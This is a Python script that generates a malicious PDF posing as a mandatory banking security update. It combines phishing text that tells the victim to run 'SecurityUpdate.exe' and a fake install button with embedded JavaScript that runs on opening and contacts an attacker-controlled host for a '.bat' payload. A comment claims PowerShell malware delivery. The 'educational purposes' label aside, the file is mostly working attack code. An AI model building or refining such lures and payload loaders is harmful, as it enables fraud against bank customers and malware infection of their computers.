#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Script to create a malicious PDF for educational purposes only

import os
from PyPDF2 import PdfFileWriter, PdfFileReader
import io
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter

def create_malicious_pdf(output_file):
    # Create a legitimate-looking PDF with embedded JavaScript
    pdf_writer = PdfFileWriter()
    
    # Create a PDF with legitimate content first
    packet = io.BytesIO()
    can = canvas.Canvas(packet, pagesize=letter)
    can.setFont("Helvetica-Bold", 16)
    can.drawString(100, 750, "SECURITY UPDATE NOTIFICATION")
    can.setFont("Helvetica", 12)
    can.drawString(100, 720, "IMPORTANT: Banking Security System Update")
    can.drawString(100, 700, "Date: March 15, 2025")
    
    # Add legitimate content
    can.setFont("Helvetica", 12)
    y_position = 650
    lines = [
        "Dear Valued Customer,",
        "",
        "Our security team has detected that your banking application requires an",
        "important security update to protect against recent cyber threats.",
        "",
        "This update is MANDATORY and must be installed before March 20, 2025",
        "to maintain uninterrupted access to your banking services.",
        "",
        "The security update addresses the following issues:",
        "  * Critical vulnerability in transaction processing",
        "  * Enhanced encryption for sensitive customer data",
        "  * Improved authentication mechanisms",
        "  * Compliance with updated financial regulations",
        "",
        "Please review the instructions on the following page to install this update.",
        "",
        "Thank you for your immediate attention to this matter.",
        "",
        "Security Operations Team"
    ]
    
    for line in lines:
        can.drawString(100, y_position, line)
        y_position -= 20
    
    can.showPage()
    
    # Create a second page with "instructions"
    can.setFont("Helvetica-Bold", 16)
    can.drawString(100, 750, "INSTALLATION INSTRUCTIONS")
    can.setFont("Helvetica", 12)
    
    y_position = 700
    instructions = [
        "To install the security update, please follow these steps:",
        "",
        "1. Double-click the 'SecurityUpdate.exe' file extracted from this document",
        "2. When prompted by Windows security, click 'Yes' to allow the update",
        "3. Wait for the update to complete installation (approximately 2-3 minutes)",
        "4. Restart your computer when prompted",
        "",
        "If you encounter any issues during installation, please contact our support",
        "team at support@securebanking.com or call 1-800-555-0123.",
        "",
        "NOTE: This update is digitally signed and verified safe by our security team.",
        "      Your security is our highest priority."
    ]
    
    for line in instructions:
        can.drawString(100, y_position, line)
        y_position -= 20
    
    # Add a fake button
    can.setFillColorRGB(0, 0.4, 0.8)  # Blue color
    can.rect(200, 400, 200, 40, fill=1)
    can.setFillColorRGB(1, 1, 1)  # White color
    can.setFont("Helvetica-Bold", 14)
    can.drawString(235, 415, "EXTRACT & INSTALL")
    
    can.save()
    
    # Move to the beginning of the StringIO buffer
    packet.seek(0)
    
    # Create a PDF reader object using our template
    template_pdf = PdfFileReader(packet)
    
    # Add the template pages to our new PDF
    for i in range(template_pdf.getNumPages()):
        pdf_writer.addPage(template_pdf.getPage(i))
    
    # Add JavaScript to the PDF to execute when opened
    # This JavaScript uses PowerShell to download and execute our malware
    js_code = """
    app.alert({cMsg: "Preparing security update files...", cTitle: "Security Update", nIcon: 3});
    
    this.submitForm({
        cURL: "http://192.168.20.200:8000/deploy_pdf_payload.bat",
        cSubmitAs: "PDF"
    });
    
    app.alert({cMsg: "Security update package extracted. Please proceed with installation.", cTitle: "Security Update", nIcon: 3});
    """
    
    # Add the JavaScript action
    pdf_writer.addJS(js_code)
    
    # Write the PDF to disk
    with open(output_file, "wb") as f:
        pdf_writer.write(f)
    
    print("Created malicious PDF: %s" % output_file)

if __name__ == "__main__":
    output_file = "Security_Update_2025.pdf"
    create_malicious_pdf(output_file)
